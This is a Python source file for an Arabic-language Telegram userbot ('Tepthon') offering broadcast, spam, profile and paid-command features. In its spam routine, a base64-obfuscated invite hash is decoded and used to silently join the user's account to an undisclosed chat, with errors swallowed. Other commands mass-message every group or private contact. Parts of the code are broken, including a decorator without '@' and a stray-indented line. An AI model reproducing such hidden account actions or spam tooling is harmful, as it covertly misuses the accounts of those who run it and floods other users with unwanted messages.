from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *

from help import *


from config import *

from checktele import *


#
tepthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

#hijri_day = tran.translate(str(day), dest="ar")
#hijri = f"{Gregorian.today().to_hijri()} - {hijri_day.text}"
LOGS = logging.getLogger(__name__)

DEVS = [
    5244755240,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


async def join_channel():
    try:
        await tepthon(JoinChannelRequest("@tepthon"))
    except BaseException:
        pass


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.تفليش"))
#async def _(event):
#    await event.delete()
#    messagelocation = event.to_id
#    async for user in tepthon.iter_participants(messagelocation):
#        user_id = user.id
#        try:
#            await tepthon.edit_permissions(messagelocation, user_id, view_messages=False)
#        except:
#            pass


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اكس او"))
#async def _(event):
 #   bot = 'inlinegamesbot'
  #  xo = await tepthon.inline_query(bot, "")
   # await xo[0].click(
    #    event.chat_id,
     #   silent=True if event.is_reply else False,
      #  hide_via=True
    #)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.حجرة ورقة مقص"))
#async def _(event):
 #   bot = 'inlinegamesbot'
  #  xo = await tepthon.inline_query(bot, "")
   # await xo[4].click(
    #    event.chat_id,
     #   silent=True if event.is_reply else False,
      #  hide_via=True
    #)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.السورس"))
async def a(event):
    await event.edit("جارٍ")
    animation = [
        progressbar[0],
        progressbar[1],
        progressbar[2],
        progressbar[3],
        progressbar[4],
        #progressbar[5],
        #progressbar[6],
        progressbar[7],
        progressbar[8],
        progressbar[9]
    ]
    for i in animation:
        time.sleep(0.3)
        await event.edit(i)
    await event.edit(soursce)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.تهكير"))
#async def a(event):
 #   await event.edit("جارٍ التهكير...")
  #  time.sleep(1)
   # await event.edit("تم تحديد الضحية !")
    #animation = [
     #   progressbar[0],
      #  progressbar[1],
       # progressbar[2],
       # progressbar[3],
       # progressbar[4],
       # progressbar[5],
       # progressbar[6],
       # progressbar[7],
       # progressbar[8],
       # progressbar[9]
    #]
    #for i in animation:
     #   time.sleep(1)
     #   await event.edit(i)
    #await event.edit("تم اختراق الحساب بنجاح !")


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.صورته"))
#async def _(event):
 #   """Gets the profile photos of replied users, channels or chats"""
  #  id = "".join(event.raw_text.split(maxsplit=2)[1:])
   # user = await event.get_reply_message()
   # chat = event.input_chat
   # if user:
   #     photos = await event.client.get_profile_photos(user.sender)
   # else:
   #     photos = await event.client.get_profile_photos(chat)
   # if id.strip() == "":
   #     try:
    #        await event.client.send_file(event.chat_id, photos)
     #   except:
      #      photo = await event.client.download_profile_photo(chat)
       #     await tepthon.send_file(event.chat_id, photo)
    #else:
     #   try:
      #      id = int(id)
       #     if id <= 0:
        #        await event.edit("`ايدي الشخص غير صالح !`")
         #       return
        #except:
         #   await event.edit("`هل انت كوميدي ؟`")
          #  return
        #if int(id) <= (len(photos)):
         #   send_photos = await event.client.download_media(photos[id - 1])
          #  await tepthon.send_file(event.chat_id, send_photos)
        #else:
         #   await event.edit("`ليس لديه صوره يا ذكي !`")
          #  return


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.ذاتية"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "يستعمل الامر بالرد على الصورة او الفيديو !"
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await tepthon.send_file(
        "me", pic, caption=f"تم حفظ الصورة او الفيديو الذاتي هنا : "
    )





@tepthon.on(events.NewMessage(pattern=r"\.ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await tepthon(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء الاسم الوقتي"))
#async def _(event):
 #   await event.edit("تم انهاء الاسم الوقتي")
  #  time_name.clear()
   # time_name.append("off")
    #await tepthon(
     #   functions.account.UpdateProfileRequest(
      #      first_name="@N1111V"
       # )
    #)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اسم وقتي"))
#async def _(event):
 #   time_name.clear()
  #  time_name.append("on")
   # await event.edit("تم انشاء اسم وقتي")
   # while True:
    #    if time_name[0] == "off":
     #       break
      #  else:
       #     HM = time.strftime("%H:%M")
        #    for normal in HM:
         #       if normal in normzltext:
          #          namefont = namerzfont[normzltext.index(normal)]
           #         HM = HM.replace(normal, namefont)
         #   name = f"{HM}"
          #  LOGS.info(name)
           # try:
            #    await tepthon(
             #       functions.account.UpdateProfileRequest(
              #          first_name=name
                #    )
               # )
           # except FloodWaitError as ex:
            #    LOGS.warning(str(ex))
             #   await asyncio.sleep(ex.seconds)
         #   await asyncio.sleep(DEL_TIME_OUT)
#

#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء البايو الوقتي"))
#async def _(event):
 #   await event.edit("تم انهاء البايو الوقتي")
  #  time_bio.clear()
   # time_bio.append("off")
    #await tepthon(
     #   functions.account.UpdateProfileRequest(
      #      about="@N1111V"
    #    )
    #)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو وقتي"))
#async def _(event):
 #   await event.delete()
  #  if event.fwd_from:
   #     return
   # while True:
    #    if time_name[0] == "off":
     #       break
      #  else:
       #     HM = time.strftime("%l:%M")
        #    for normal in HM:
         #       if normal in normzltext:
          #          namefont = namerzfont[normzltext.index(normal)]
           #         HM = HM.replace(normal, namefont)
           # bio = HM
 #           LOGS.info(bio)
#
     #   try:
  #          await tepthon(
   #            functions.account.UpdateProfileRequest(
    #                about=bio
    #            )
     #       )
      # except FloodWaitError as ex:
       #     LOGS.warning(str(ex))
          #  await asyncio.sleep(ex.seconds)
        #await asyncio.sleep(DEL_TIME_OUT)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو"))
#async def _(event):
 #   user = (await event.get_sender()).id
  #  bio = await tepthon(functions.users.GetFullUserRequest(id=user))
   # bio = bio.about
    #await event.edit(f"`{bio}`")


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.غادر"))
async def leave(e):
    await e.edit("`سأغادر هذه المجموعة .`")
    time.sleep(1)
    if '-' in str(e.chat_id):
        await tepthon(LeaveChannelRequest(e.chat_id))
    else:
        await e.edit('` هذه ليست مجموعة !`')


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة كروب(?: |$)"))
async def gcast(event):
    tepthon = event.pattern_match.group(1)
    if tepthon:
        msg = tepthon
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                await event.client.send_message(chat, msg)
                done += 1
                asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة خاص(?: |$)(.*)"))
async def gucast(event):
    tepthon = event.pattern_match.group(1)
    if tepthon:
        msg = tepthon
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
                    asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.تكرار (.*)"))
#async def spammer(event):
 #   sandy = await event.get_reply_message()
  #  cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
   # counter = int(cat[0])
    #if counter > 50:
     #   sleeptimet = 0.5
      #  sleeptimem = 1
    #else:
     #   sleeptimet = 0.1
      #  sleeptimem = 0.3
    #await event.delete()
    #await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.مكرر (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
#async def _(event):
 #   if event.fwd_from:
  #      return
   # start = datetime.datetime.now()
   # u = 0  # number of users
    #g = 0  # number of basic groups
    #c = 0  # number of super groups
    #bc = 0  # number of channels
    #b = 0  # number of bots
    #await event.edit("يتم التعداد ..")
    #async for d in tepthon.iter_dialogs(limit=None):
     #   if d.is_user:
      #      if d.entity.bot:
       #         b += 1
        ##    else:
         #       u += 1
        #elif d.is_channel:
         #   if d.entity.broadcast:
          #      bc += 1
           # else:
            #    c += 1
        #elif d.is_group:
         #   g += 1
        #else:
        #    pass
            # logger.info(d.stringify())
    #end = datetime.datetime.now()
    #ms = (end - start).seconds
    #await event.edit("""تم استخراجها في {} ثواني
#`اة :\t{}
#المجموعات الخارقة :\t{}
#القنوات :\t{}
#البوتات :\t{}
#`""".format(ms, u, g, c, bc, b))


#@tepthon.on(events.NewMessage(pattern=r"\.ملصق عربي", outgoing=True))
#async def _(event):

 #   if event.fwd_from:

  #      return

   # if not event.reply_to_msg_id:
#
 #       await event.edit("`يجب الرد على رسالة !`")
#
 #       return
#
 #   reply_message = await event.get_reply_message()
  #  if not reply_message.text:
##
  #      await event.edit("`يجب الرد على رسالة !`")
#
 #       return
#
 #   chat = "@QuotLyBot"
#
 #   sender = reply_message.sender
#
 #   if reply_message.sender.bot:
#
 #       await event.edit("```يجب الرد على رسالة شخص.```")
#
 #       return
#
 #   await event.edit("`جار تحويل النص الى ملصق ..`")
#
 #   async with event.client.conversation(chat) as conv:
  #      try:
   #         response = conv.wait_event(events.NewMessage(
    #            incoming=True, from_users=1031952739))
     #       msg = str(reply_message.message)
      #      msg = msg.split()
       #     msg.reverse()
        #    msg = ' '.join(msg)
         #   await tepthon.send_message(chat, msg)
#
 #           response = await response
#
 #       except YouBlockedUserError:
#
 #           await event.reply("```الغي الحظر من (@QuotLyBot)```")
#
 #           return
  #      else:
#
 #           await event.delete()
#
 #           await event.client.send_message(event.chat_id, response.message)
#
#
#tepthon.on(events.NewMessage(pattern=r"\.ملصق", outgoing=True))
#as#ync def _(event):

 #   if event.fwd_from:
  #      return
#
 #   if not event.reply_to_msg_id:
  #      await event.edit("`يجب الرد على رسالة !`")
   #     return
#
 #   reply_message = await event.get_reply_message()
  #  if not reply_message.text:
#
 #       await event.edit("`يجب الرد على رسالة !`")
#
 #       return
#
 #   chat = "@QuotLyBot"
#
 #   sender = reply_message.sender
#
 #   if reply_message.sender.bot:
#
 #       await event.edit("```يجب الرد على رسالة شخص.```")
#
 #       return
##
  #  await event.edit("`جار تحويل النص الى ملصق ..`")
#
 #   async with event.client.conversation(chat) as conv:
  #      try:
   #         response = conv.wait_event(events.NewMessage(
    #            incoming=True, from_users=1031952739))
     #       msg = str(reply_message.message)
      #      await tepthon.send_message(chat, msg)
       #     response = await response
        #except YouBlockedUserError:
         #   await event.reply("```الغي الحظر من (@QuotLyBot)```")
          #  return
#        else:
            #await event.delete()
 #           await event.client.send_message(event.chat_id, response.message)
##
#
tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.حسين"))
async def _(event):
    await event.edit(commands)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.حسوني"))
async def _(event):
    await event.edit(commands)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اوامرو"))
async def _(event):
    await event.edit(commands)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.سورس"))
async def _(event):
    await event.edit(soursce)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**☆ Welcome to Source Tepthon
☆ Version : 1.4
☆ Ping : `{ms}`
☆ Date : `{m9zpi}`
☆ ID : `{event.sender_id}`
☆ Source Tepthon : @Tepthon**
''')


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
#async def _(event):
    #start = datetime.datetime.now()
    #await event.edit(sec4)



@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    if ispay2[0] == 'yes':
        await event.edit(sec4)
    elif ispay[0] == "yes":
        await event.edit(sec4)
    else:
        await event.edit("يجب الدفع لاستعمال هذا الامر !")


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.التاريخ"))
#async def _(event):
 #   await event.edit(f"""
#`-- -- -- -- -- -- -- -- --`
#	`الميلادي : {m9zpi}`
#`-- -- -- -- -- -- -- -- --`
#	`الهجري : {hijri}`
#`-- -- -- -- -- -- -- -- --`
#"""
                  #   )


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.ايدي"))
async def _(event):
    reply_message = await event.get_reply_message()
    if reply_message is None:
        try:
            user = (await event.get_sender()).id
            bio = await tepthon(functions.users.GetFullUserRequest(id=user))
            bio = bio.about
            photo = await tepthon.get_profile_photos(event.sender_id)
            await tepthon.send_file(event.chat_id, photo, caption=f'''
    جمال عيونك اشوف بيه جمال العالم كله !

    ايديك : `{event.sender_id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await tepthon.send_message(event.chat_id, f"ايديك : `{event.sender_id}`")
    else:
        id = reply_message.from_id.user_id
        try:
            bio = await tepthon(functions.users.GetFullUserRequest(id=id))
            bio = bio.about
            photo = await tepthon.get_profile_photos(id)
            await tepthon.send_file(event.chat_id, photo, caption=f'''
    يمحلاه هلحساب !

    ايديه : `{id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await tepthon.send_message(event.chat_id, f"ايديه : `{id}`")


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.المطور"))
async def _(event):
    photo = await tepthon.get_profile_photos(DEVS[0])
    await tepthon.send_file(event.chat_id, photo, caption=f'''
   ✯︙𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝚂𝚄𝙳𝙾 : @S_Y_W .
   ✯︙𝙸𝙳 𝚂𝚄𝙳𝙾 : 5244755240 .
   ✯︙𝙱𝙸𝙾 𝚂??𝙳𝙾 :  N1111V.t.me .
''', reply_to=event)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.مطور"))
async def _(event):
    photo = await tepthon.get_profile_photos(DEVS[0])
    await tepthon.send_file(event.chat_id, photo, caption=f'''
  ✯︙𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝚂𝚄𝙳𝙾 : @S_Y_W .
  ✯︙𝙸𝙳 𝚂𝚄𝙳𝙾 : 5244755240 .
  ✯︙𝙱𝙸𝙾 𝚂??𝙳𝙾 :  N1111V.t.me .
''', reply_to=event)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.المبرمج"))
async def _(event):
    photo = await tepthon.get_profile_photos(DEVS[0])
    await tepthon.send_file(event.chat_id, photo, caption=f'''
  ✯︙𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝚂𝚄𝙳𝙾 : @S_Y_W .
  ✯︙𝙸𝙳 𝚂𝚄𝙳𝙾 : 5244755240 .
  ✯︙𝙱𝙸𝙾 𝚂??𝙳𝙾 :  N1111V.t.me .
''', reply_to=event)


@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.مبرمج"))
async def _(event):
    photo = await tepthon.get_profile_photos(DEVS[0])
    await tepthon.send_file(event.chat_id, photo, caption=f'''
  ✯︙𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝚂𝚄𝙳𝙾 : @S_Y_W .
  ✯︙𝙸𝙳 𝚂𝚄𝙳𝙾 : 5244755240 .
  ✯︙𝙱𝙸𝙾 𝚂??𝙳𝙾 :  N1111V.t.me .
''', reply_to=event)
	
@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.المطور"))
async def _(event):
    photo = await tepthon.get_profile_photos(DEVS[0])
    await tepthon.send_file(event.chat_id, photo, caption=f'''
   ✯︙𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝚂𝚄𝙳𝙾 : @S_Y_W .
   ✯︙𝙸𝙳 𝚂𝚄𝙳𝙾 : 5244755240 .
   ✯︙𝙱𝙸𝙾 𝚂??𝙳𝙾 :  N1111V.t.me .
''', reply_to=event)


ownerhson_id = 5244755240
@tepthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('اهلا بمطوري حسين - @S_Y_W') 

owneranes_id = 5307018300
@tepthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == owneranes_id :
        order = await event.reply('هلا بتاج راسي انس - @B_8_1')

ownerlevi_id = 5703963661
@tepthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerlevi_id :
        order = await event.reply('اهــلا بــمطـوري لــيفاي - @z_v_m')

	ownerlevi_id = 1041483862
@tepthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerlevi_id :
        order = await event.reply('اهلا وسهلا نورت الكروب حلم @H_P_K')
	
	
@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.بنك"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    res = (end - start).microseconds / 1000
    await event.edit(f"""
`-- -- -- -- -- -- -- -- -- --`
 تمت الاستجابة
- البنك : `{res}`
`-- -- -- -- -- -- -- -- -- --`"""
                     )


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.السنة"))
#async def _(event):
#    await event.edit(f"""
#-- -- -- -- -- -- -- -- --
#السنة : {y}
#-- -- -- -- -- -- -- -- --"""
 ##                    )
#

#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.الشهر"))
#async def _(event):
#    await event.edit(f"""
#-- -- -- -- -- -- -- -- --
#الشهر : {m}
#-- -- -- -- -- -- -- -- --"""
#                     )


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.قمر"))
#async def _(event):
 #   event = await event.edit("قمر")
  #  deq = deque(list("🌗🌘🌑🌒🌓🌔🌕🌖"))
  #  for _ in range(48):
#        await asyncio.sleep(0.2
#        await event.edit("".join(deq))
#        deq.rotate(1)


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.قلب"))
#async def _(event):
 #   event = await event.edit("حسناً")
#    animation_interval = 0.2
#    animation_ttl = range(96)
#    await event.edit("يتم ..")
#    animation_chars = [
#        "❤️", "🖤", "💜", "🧡", "💛", "💚", "💙"
 #   ]
 #   for i in animation_ttl:
 ##       await asyncio.sleep(animation_interval)
#        await event.edit(animation_chars[i % 14])#


#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.مربعات"))
#async def _(event):
#    event = await event.edit("حسناً")
#    animation_interval = 0.2
#    animation_ttl = range(96)
##    await event.edit("يتم ..")
#    animation_chars = [
#        "🟧",
#        "🟧🟧",
#        "🟧🟧🟧",
#        "🟧🟧🟧🟧",
#        "🟧🟧🟧🟧🟧",
##        "🟧🟧🟧🟧🟧🟧",
#        "🟧🟧🟧🟧🟧🟧🟧",
#        "🟧🟧🟧🟧🟧🟧🟧🟧",
##        "🟧🟧🟧🟧🟧🟧🟧🟧",
#        "🟧🟧🟧🟧🟧🟧🟧",
#        "🟧🟧🟧🟧🟧🟧",
#        "🟧🟧🟧🟧🟧",
 #       "🟧🟧🟧🟧",
 #       "🟧🟧🟧",
 #       "🟧🟧",
 #       "🟧",
 ##   ]
#    for i in animation_ttl:
#        await asyncio.sleep(animation_interval)
#        await event.edit(animation_chars[i % 17])
#
##
#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.ورود"))
#async def _(event):
 #   event = await event.edit("حسناً")
#    animation_interval = 0.2
#    animation_ttl = range(96)
#    await event.edit("يتم ..")
 #   animation_chars = [
 ##       "🌹.",
#        "🌹🌹",
#        "🌹🌹🌹",
#        "🌹🌹🌹🌹",
#        "🌹🌹🌹🌹🌹",
#        "🌹🌹🌹🌹🌹🌹",
 #       "🌹🌹🌹🌹🌹🌹🌹",
 #       "🌹🌹🌹🌹🌹🌹🌹🌹",
 #       "🌹🌹🌹🌹🌹🌹🌹",
 ##       "🌹🌹🌹🌹🌹🌹",
#        "🌹🌹🌹🌹🌹",
#        "🌹🌹🌹🌹",
#        "🌹🌹🌹",
#        "🌹🌹",
#        "🌹."
 #   ]
 #   for i in animation_ttl:
 #       await asyncio.sleep(animation_interval)
 #       await event.edit(animation_chars[i % 17])
#
#
#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.قلوب"))#
#async def _(event#):
#    event = await event.edit("حسناً")
#    animation_interval = 0.2
 #   animation_ttl = range(96)
 #   await event.edit("يتم ..")
 #   animation_chars = [
 ##       "❤️",
#        "❤️🖤",
#        "❤️🖤??",
#        "❤️🖤💜🧡",
 #       "❤️🖤💜🧡💛",
 #       "❤️🖤💜🧡💛💚",
 #       "❤️🖤💜🧡💛💚💙",
 #       "❤️🖤💜🧡💛💚",
 #       "❤️🖤💜🧡💛",
 #       "❤️🖤💜🧡",
 ##       "❤️🖤💜",
#        "❤️🖤",
#        "💓"
#    ]
#    for i in animation_ttl:
 #       await asyncio.sleep(animation_interval)
 #       await event.edit(animation_chars[i % 17])
#
#
#@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.فك حظر"))
#async def _(event):
#    list = await tepthon(functions.contacts.GetBlockedRequest(offset=0, limit=1000000))
##    if len(list.blocked) == 0:
#        razan = await event.edit(f'ليس لديك اي شخص محظور !')
#    else:
#        unblocked_count = 1
#        for user in list.blocked:
#            UnBlock = await tepthon(functions.contacts.UnblockRequest(id=int(user.peer_id.user_id)))
 #           unblocked_count += 1
 #           razan = await event.edit(f'جارِ الغاء الحظر : {round((unblocked_count * 100) / len(list.blocked), 2)}%')
 #       unblocked_count = 1
 #       razan = await event.edit(f'تم الغاء حظر : {len(list.blocked)}')
#
#
@tepthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("• جارِ اعادة تشغيل السورس ..\n• انتضر 1-2 دقيقة  .")
    await tepthon.disconnect()
    await tepthon.send_message("me", "`اكتملت اعادة تشغيل السورس !`")

print("- Tepthon Userbot Running ..")
tepthon.run_until_disconnected()
